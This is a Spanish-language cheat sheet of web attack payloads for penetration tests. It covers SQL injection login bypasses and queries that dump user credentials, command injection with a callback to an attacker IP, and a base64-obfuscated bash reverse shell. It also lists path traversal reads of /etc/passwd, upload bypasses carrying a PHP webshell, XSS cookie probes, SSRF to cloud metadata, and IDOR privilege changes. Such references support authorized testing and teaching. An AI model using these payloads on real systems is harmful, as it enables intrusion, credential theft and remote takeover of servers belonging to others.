# Web Testing & Vulnerability Payloads Cheat Sheet

Guía de pruebas manuales, fuzzing de parámetros y payloads para auditorías web y pruebas de penetración (SQLi, XSS, LFI/RFI, Command Injection, File Upload Bypasses, SSRF, IDOR).

---

## 1. Inyección SQL (SQL Injection - SQLi)

### A. Detección Rápida de Vulnerabilidad
Insertar en campos de texto, formularios de login o parámetros GET/POST:
```text
'
"
'--
' #
')
'")
';
```

### B. Bypass de Login (Authentication Bypass)
Probar en los campos `username` o `password`:
```text
admin' -- -
admin' #
' OR 1=1 -- -
' OR 1=1 #
' OR '1'='1
' OR 1=1 LIMIT 1 -- -
" OR "1"="1
```

### C. Union-Based SQLi
1. **Determinar número de columnas**:
   ```sql
   ' ORDER BY 1-- -
   ' ORDER BY 2-- -
   ' ORDER BY 3-- -   -- (Subir número hasta dar error)
   ```
2. **Identificar columnas reflejadas en pantalla**:
   ```sql
   ' UNION SELECT 1,2,3-- -
   ' UNION SELECT NULL,NULL,NULL-- -
   ```
3. **Extraer información del sistema (MySQL/MariaDB)**:
   ```sql
   ' UNION SELECT 1, version(), user()-- -
   ' UNION SELECT 1, database(), schema()-- -
   ```
4. **Enumerar Tablas y Columnas (MySQL)**:
   ```sql
   -- Listar nombres de tablas de la base de datos actual
   ' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()-- -

   -- Listar nombres de columnas de una tabla (ej. 'users')
   ' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'-- -

   -- Extraer datos (usuarios y contraseñas)
   ' UNION SELECT 1, username, password FROM users-- -
   ' UNION SELECT 1, concat(username, ':', password), 3 FROM users-- -
   ```

### D. Blind SQLi (Basada en Tiempo)
Prueba de ejecución diferida si la aplicación no muestra errores ni resultados en pantalla:
```sql
-- MySQL / MariaDB
' AND SLEEP(5)-- -

-- PostgreSQL
' AND pg_sleep(5)-- -

-- Microsoft SQL Server (MSSQL)
'; WAITFOR DELAY '0:0:5'-- -
```

---

## 2. Inyección de Comandos (Command Injection - RCE)

### A. Caracteres Separadores
Probar concatenar comandos en parámetros que procesen entrada del sistema (ej. IPs en pings):
```text
; id
| id
&& id
|| id
`id`
$(id)
```

### B. Payloads de Verificación (Out-of-Band / Ping Test)
```bash
; ping -c 4 <TU_IP_ATACANTE>
; curl http://<TU_IP_ATACANTE>/test
```

### C. Bypasses de Espacio y Filtros de Caracteres
* **Linux (Uso de `${IFS}`)**:
  ```bash
  ;cat${IFS}/etc/passwd
  ;cat$IFS$9/etc/passwd
  ```
* **Linux (Redirección de entrada)**:
  ```bash
  ;cat</etc/passwd
  ```
* **Codificación en Base64**:
  ```bash
  ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=|base64 -d|bash
  ```

---

## 3. Local File Inclusion (LFI) & Path Traversal

### A. Payloads de Lectura Directa
```text
../../../../etc/passwd
../../../../boot.ini
../../../../windows/win.ini
../../../../var/log/apache2/access.log
```

### B. Bypasses de Filtros en LFI
* **Traversals Anidados (si reemplazan `../` por cadena vacía)**:
  `....//....//....//etc/passwd`
* **Bypass de Extensión Forzada (`.php`) con Nulled Byte (PHP < 5.3.4)**:
  `../../../../etc/passwd%00`
* **Codificación URL**:
  `..%2f..%2f..%2fetc%2fpasswd`
  `..%252f..%252f..%252fetc%252fpasswd` (Doble codificación)

### C. Wrappers de PHP (`php://filter`)
Descargar el código fuente de scripts en servidor web (evita que se ejecute el PHP):
```text
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
```

---

## 4. Subida de Archivos Vulnerables (File Upload Bypasses)

### A. Evasión por Extensión (Extension Bypasses)
Si `.php` o `.exe` está bloqueado, probar extensiones alternativas:
```text
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar
shell.php.jpg
shell.jpg.php
```

### B. Manipulación de Content-Type en Petición HTTP
Modificar la cabecera `Content-Type` en Burp Suite:
```http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

### C. Magic Bytes (Falsificación de Firma de Archivo)
Añadir los primeros bytes de una imagen válida al inicio del webshell:
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

---

## 5. Cross-Site Scripting (XSS)

### A. Payloads Básicos de Prueba (Reflected / Stored)
```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### B. Inyección en Atributos HTML
Si el input se refleja dentro de un atributo (ej. `<input value="TU_INPUT">`):
```html
" onfocus="alert(1)" autofocus="
" autofocus onfocus="alert(1)
' onclick='alert(1)'
```

---

## 6. Server-Side Request Forgery (SSRF)

Pruebas para forzar a la aplicación web a realizar peticiones HTTP a recursos internos o metadata.

### A. Acceso a Localhost / Loopback
```text
http://127.0.0.1/admin
http://localhost/admin
http://127.0.0.1:8080
http://[::1]/admin
```

### B. Endpoints de Metadata Cloud
```text
http://169.254.169.254/latest/meta-data/          -- AWS
http://169.254.169.254/computeMetadata/v1/         -- GCP
http://169.254.169.254/metadata/instance?api-version=2021-02-01 -- Azure
```

---

## 7. Insecure Direct Object References (IDOR)

Pruebas de manipulación de identificadores en peticiones GET/POST o APIs JSON:

```http
GET /api/user/profile?id=1001  --> Cambiar a id=1002
GET /download/invoice?file_id=550 --> Cambiar a file_id=551
POST /account/update HTTP/1.1
{"user_id": 105, "role": "user"}  --> Cambiar a {"user_id": 105, "role": "admin"}
```
